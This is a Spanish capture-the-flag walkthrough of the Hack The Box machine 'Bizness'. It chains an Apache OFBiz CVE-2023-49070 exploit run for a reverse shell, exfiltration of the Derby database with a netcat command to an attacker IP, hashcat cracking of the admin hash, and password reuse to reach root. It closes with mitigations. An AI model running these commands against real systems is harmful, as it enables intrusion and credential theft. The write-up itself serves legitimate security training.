---
title: "HTB Walkthrough: Bizness"
date: 2026-09-24
draft: false
description: "Walkthrough completo de la máquina Bizness de Hack The Box. Dificultad Fácil, Linux. RCE pre-autenticación en Apache OFBiz (CVE-2023-49070) → exfiltración de la base de datos embebida Apache Derby → cracking del hash SHA1 del usuario admin → escalada a root por reutilización de contraseña."
tags: ["HackTheBox", "Linux", "Easy", "OFBiz", "CVE-2023-49070", "RCE", "ApacheDerby", "HashCracking", "PasswordReuse", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **Bizness** en Hack The Box. Máquina de dificultad **Fácil** con **Linux**. El servidor expone **Apache OFBiz 18.12** vulnerable a **CVE-2023-49070**, un RCE pre-autenticación por deserialización insegura en el endpoint XML-RPC. Desde la shell obtenida como `ofbiz` se localiza la base de datos embebida **Apache Derby**, se exfiltra y analiza localmente con el cliente `ij`, revelando el hash SHA1 de la contraseña del administrador. Crackeada la contraseña con `hashcat`, resulta ser también la contraseña de **root** del sistema operativo — reutilización clásica entre capas.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                              |
|----------------|--------------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | Bizness                                                                                                                              |
| **SO**         | Linux                                                                                                                                |
| **Dificultad** | Fácil                                                                                                                                |
| **IP**         | 10.129.19.87                                                                                                                         |
| **Técnicas**   | CVE-2023-49070 RCE pre-auth · Exfiltración Apache Derby · Hash SHA1 cracking (hashcat -m 120) · Reutilización de contraseña a root  |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.19.87
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
34747/tcp open  unknown
```

```bash
echo "10.129.19.87 bizness.htb" >> /etc/hosts
```

### 1.2 Detección de Servicio Web

```bash
nmap -sC -sV -p80,443 10.129.19.87
```

> **💡 Superficie de ataque:** los puertos 80/443 sirven una aplicación construida sobre **Apache OFBiz**, un ERP de código abierto. La versión se puede identificar por las cabeceras de respuesta y la página de login en `/content/control/main`.

---

## 2. Enumeración Web

```bash
feroxbuster -k -u https://bizness.htb
```

```
200  GET  /content/control/main
302  GET  /accounting → /accounting/control/main
302  GET  /webtools  → /webtools/control/main
```

El escaneo confirma que la instancia es **Apache OFBiz 18.12** y que los endpoints de control requieren autenticación.

> **⚠️ Versión vulnerable:** Apache OFBiz **18.12** es vulnerable a **CVE-2023-49070**, un RCE pre-autenticación derivado de una deserialización insegura en el manejo de peticiones XML-RPC. No se necesitan credenciales para explotarlo.

---

## 3. Explotación — CVE-2023-49070 (RCE Pre-Auth en Apache OFBiz)

### 3.1 Preparar el Listener

```bash
nc -nlvp 4444
```

### 3.2 Ejecutar el Exploit

```bash
python3 CVE-2023-49070.py https://bizness.htb/ 10.10.14.211:4444
```

```
Normal flow:    petición XML-RPC legítima → OFBiz procesa los parámetros de forma segura
Flujo malicioso: petición XML-RPC con objeto serializado malicioso → deserialización insegura
                 → ejecución de comando arbitrario antes de autenticarse
                 → conexión saliente → reverse shell como ofbiz
```

### 3.3 Recepción y Estabilización de la Shell

```
Listening on 0.0.0.0 4444
Connection received on 10.129.19.87 33338
bash: cannot set terminal process group (623): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm SHELL=bash
stty rows 40 cols 150
reset
```

> **💡 Por qué funciona:** el endpoint XML-RPC de OFBiz 18.12 deserializa datos de usuario sin validar su origen, lo que permite ejecutar código arbitrario antes de cualquier comprobación de autenticación. El parche aplica validación de firmas en el proceso de deserialización.

---

## 4. User Flag

```bash
cat /home/ofbiz/user.txt
```

> 🔑 User flag obtenida.

---

## 5. Enumeración Post-Explotación — Base de Datos Apache Derby

### 5.1 Esquema de Hashing de Contraseñas

```bash
cat framework/security/config/security.properties | grep hash
```

```
password.encrypt.hash.type=SHA
```

> **💡 Hallazgo clave:** OFBiz usa **SHA** para cifrar las contraseñas de sus usuarios de aplicación. El formato real del hash almacenado en la base de datos es `$SHA$<salt>$<hash_en_base64url>` — crackeable offline si la contraseña es débil.

### 5.2 Localización de la Base de Datos Embebida

Por defecto, Apache OFBiz usa **Apache Derby** como base de datos embebida:

```bash
ls /opt/ofbiz/runtime/data/derby/
```

```
derby.log  ofbiz  ofbizolap  ofbiztenant
```

---

## 6. Exfiltración de la Base de Datos Derby

### 6.1 Comprimir y Verificar

```bash
cd /opt/ofbiz/runtime/data/
tar -czf /tmp/derby.tar.gz derby
md5sum /tmp/derby.tar.gz
```

```
8517b4cff97974d8dd996a54c69cfb97  /tmp/derby.tar.gz
```

### 6.2 Transferir vía `nc`

En la máquina atacante:

```bash
nc -lvnp 80 > derby.tar.gz
```

En la víctima:

```bash
cat /tmp/derby.tar.gz | nc 10.10.15.193 80
```

Verificamos la integridad en local:

```bash
md5sum derby.tar.gz
```

```
8517b4cff97974d8dd996a54c69cfb97  derby.tar.gz
```

```bash
tar -xzf derby.tar.gz && ls derby/
```

```
derby.log  ofbiz  ofbizolap  ofbiztenant
```

---

## 7. Análisis de la Base de Datos con `ij`

`ij` es el cliente interactivo de línea de comandos incluido con Apache Derby.

```bash
ij
```

```
ij version 10.14
ij> connect 'jdbc:derby:./ofbiz';
```

### 7.1 Explorar el Esquema

```sql
ij> show SCHEMAS;
```

```
TABLE_SCHEM
-----------
APP
NULLID
OFBIZ
SQLJ
SYS
...
12 rows selected
```

```sql
ij> describe OFBIZ.USER_LOGIN;
```

```
COLUMN_NAME          TYPE_NAME
USER_LOGIN_ID        VARCHAR
CURRENT_PASSWORD     VARCHAR
PASSWORD_HINT        VARCHAR
...
```

### 7.2 Extraer Credenciales de Usuarios

```sql
ij> select USER_LOGIN_ID, CURRENT_PASSWORD, PASSWORD_HINT from OFBIZ.USER_LOGIN;
```

```
USER_LOGIN_ID | CURRENT_PASSWORD                      | PASSWORD_HINT
system        | NULL                                  | NULL
anonymous     | NULL                                  | NULL
admin         | $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I    | NULL

3 rows selected
```

> **🔑 Hash obtenido:** el hash de `admin` sigue el formato `$SHA$<salt>$<hash_base64url>` — la sal es el carácter `d` y el hash está codificado en base64 URL-safe.

---

## 8. Cracking del Hash de `admin`

### 8.1 Decodificar de Base64 URL-Safe a Hexadecimal

```python
import base64
s = 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
s += '=' * (-len(s) % 4)
print(base64.urlsafe_b64decode(s).hex())
```

```
b8fd3f41a541a435857a8f3e751cc3a91c174362
```

### 8.2 Preparar para `hashcat` (formato `sha1($salt.$pass)`)

```bash
echo "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" > hash.txt
```

### 8.3 Cracking con `hashcat`

```bash
hashcat hash.txt -m 120 /usr/share/wordlists/rockyou.txt
```

```
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness

Status: Cracked
Hash.Mode: 120 (sha1($salt.$pass))
Recovered: 1/1 (100.00%)
```

> **🔑 Contraseña obtenida:** `monkeybizness`

---

## 9. Escalada a Root — Reutilización de Contraseña

```bash
su -
```

```
Password: monkeybizness
root@bizness:~#
```

```
Flujo normal:    cuentas de aplicación y sistema operativo con contraseñas independientes
Flujo malicioso: contraseña de ofbiz admin crackeada == contraseña de root del SO
                 → su - con la misma contraseña → root inmediato
```

> **⚠️ Exposición crítica:** la contraseña del usuario `admin` de la aplicación OFBiz es idéntica a la de `root` en el sistema operativo — reutilización de credenciales entre capas que no deben compartir secretos.

---

## 10. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtenida.

---

## 11. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Nmap revela puertos 80/443. Enumeración identifica Apache OFBiz 18.12.
2. **CVE-2023-49070** → RCE pre-autenticación por deserialización insegura en el endpoint XML-RPC → reverse shell como `ofbiz`.
3. **User flag** → `/home/ofbiz/user.txt`.
4. **Derby DB** → `security.properties` revela esquema de hash SHA. Base de datos embebida localizada en `/opt/ofbiz/runtime/data/derby/`.
5. **Exfiltración** → compresión con `tar` + transferencia vía `nc` → análisis local con `ij`.
6. **Hash cracking** → decodificación base64url → `hashcat -m 120` + `rockyou.txt` → contraseña `monkeybizness`.
7. **Root** → `su -` con la misma contraseña → `root@bizness`.

**Qué aprendí de esta máquina:**

- **CVE-2023-49070 demuestra que la deserialización sin validación es RCE.** OFBiz 18.12 procesa objetos serializados Java en el endpoint XML-RPC antes de autenticar al remitente. No hace falta credencial alguna; basta con enviar el payload correcto. La defensa es deshabilitar endpoints innecesarios y validar firmas antes de deserializar.

- **Las bases de datos embebidas son un vector de exfiltración que se pasa por alto.** Apache Derby almacena todos los datos —incluidas las credenciales de los usuarios de la aplicación— en archivos en disco, accesibles directamente por la cuenta del servicio. Un atacante que obtenga una shell puede comprimir y exfiltrar la base de datos completa sin tocar ningún puerto de base de datos.

- **El formato de hash propio de OFBiz (SHA1 con sal corta) es débil por diseño moderno.** `sha1($salt.$pass)` con una sal de un solo carácter ofrece nula resistencia a ataques de diccionario en GPU. `hashcat -m 120` con `rockyou.txt` lo crackea en segundos. Los sistemas modernos deben usar bcrypt, scrypt o Argon2 con sal larga por usuario.

- **La reutilización de contraseñas entre capas multiplica el radio de impacto.** Comprometer la contraseña de un usuario de aplicación (`admin` de OFBiz) no debería dar acceso al sistema operativo. Cuando las contraseñas se comparten, la debilidad de cualquier capa compromete todas las demás simultáneamente.

- **`ij` permite analizar una base de datos Derby offline sin servidor.** Basta con tener los archivos en disco y conectar localmente con `jdbc:derby:./ofbiz`. Esto hace que la exfiltración sea completamente pasiva — no hay consultas de red que detectar.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| CVE-2023-49070 — RCE pre-auth en Apache OFBiz 18.12 | Actualizar OFBiz a una versión parcheada; deshabilitar el endpoint XML-RPC si no se usa; restringir acceso desde redes no confiables |
| Base de datos Apache Derby exfiltrable por el usuario de servicio | Aplicar mínimo privilegio al proceso; restringir permisos de lectura sobre el directorio de datos; considerar base de datos externa con credenciales separadas |
| Hash SHA1 con sal corta crackeable offline | Migrar a bcrypt, scrypt o Argon2 con sal aleatoria larga por usuario; nunca usar SHA/MD5 para almacenar contraseñas |
| Contraseña débil presente en diccionarios (`monkeybizness`) | Aplicar políticas de complejidad; auditar contraseñas nuevas contra diccionarios filtrados |
| Reutilización de contraseña entre usuario de aplicación y cuenta root del SO | Nunca compartir credenciales entre cuentas de aplicación y del sistema; gestión de secretos independiente por capa |
| Proceso de servicio con acceso excesivo al sistema de ficheros | Ejecutar OFBiz como usuario sin privilegios; aplicar chroot o contenedores para aislar el sistema de ficheros accesible |
